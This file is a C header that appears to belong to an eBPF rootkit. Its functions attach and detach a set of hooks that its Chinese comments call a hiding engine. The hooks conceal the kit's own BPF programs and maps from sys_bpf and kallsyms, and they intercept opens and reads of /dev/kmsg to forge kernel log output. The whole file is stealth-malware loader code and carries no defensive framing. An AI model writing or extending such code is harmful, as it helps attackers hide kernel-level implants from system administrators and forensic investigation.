#ifndef __MOD_HIDE_H
#define __MOD_HIDE_H

#include <linux/bpf.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "common.h"
#include "kit.skel.h"

/**
 * 挂载隐藏引擎的所有钩子
 */
int attach_hide_all(struct kit_bpf *skel) {
    //int err;

    // --- 1. 原有的 BPF 对象隐藏钩子 ---
    skel->links.handle_bpf_enter = bpf_program__attach(skel->progs.handle_bpf_enter);
    if (libbpf_get_error(skel->links.handle_bpf_enter)) return -1;

    skel->links.kretprobe_sys_bpf = bpf_program__attach(skel->progs.kretprobe_sys_bpf);
    if (libbpf_get_error(skel->links.kretprobe_sys_bpf)) return -1;

    skel->links.kprobe_bpf_prog_kallsyms_add = bpf_program__attach(skel->progs.kprobe_bpf_prog_kallsyms_add);
    if (libbpf_get_error(skel->links.kprobe_bpf_prog_kallsyms_add)) return -1;

    skel->links.kprobe_bpf_map_new_fd = bpf_program__attach(skel->progs.kprobe_bpf_map_new_fd);
    if (libbpf_get_error(skel->links.kprobe_bpf_map_new_fd)) return -1;
    
    // Openat 入口 & 出口 (用于绑定 /dev/kmsg 的 FD)
    skel->links.kmsg_open_enter = bpf_program__attach(skel->progs.kmsg_open_enter);
    if (libbpf_get_error(skel->links.kmsg_open_enter)) return -1;

    skel->links.kmsg_open_exit = bpf_program__attach(skel->progs.kmsg_open_exit);
    if (libbpf_get_error(skel->links.kmsg_open_exit)) return -1;

    // Read 入口 & 出口 (用于伪造数据)
    skel->links.kmsg_read_enter = bpf_program__attach(skel->progs.kmsg_read_enter);
    if (libbpf_get_error(skel->links.kmsg_read_enter)) return -1;

    skel->links.kmsg_read_exit = bpf_program__attach(skel->progs.kmsg_read_exit);
    if (libbpf_get_error(skel->links.kmsg_read_exit)) return -1;

    return 0;
}

/**
 * 卸载隐藏引擎
 */
int detach_hide_all(struct kit_bpf *skel) {
    // 卸载原有钩子
    detach_link_generic(skel->links.handle_bpf_enter);
    detach_link_generic(skel->links.kretprobe_sys_bpf);
    detach_link_generic(skel->links.kprobe_bpf_prog_kallsyms_add);
    detach_link_generic(skel->links.kprobe_bpf_map_new_fd);

    // 卸载 KMSG 钩子
    detach_link_generic(skel->links.kmsg_open_enter);
    detach_link_generic(skel->links.kmsg_open_exit);
    detach_link_generic(skel->links.kmsg_read_enter);
    detach_link_generic(skel->links.kmsg_read_exit);

    return 0;
}

#endif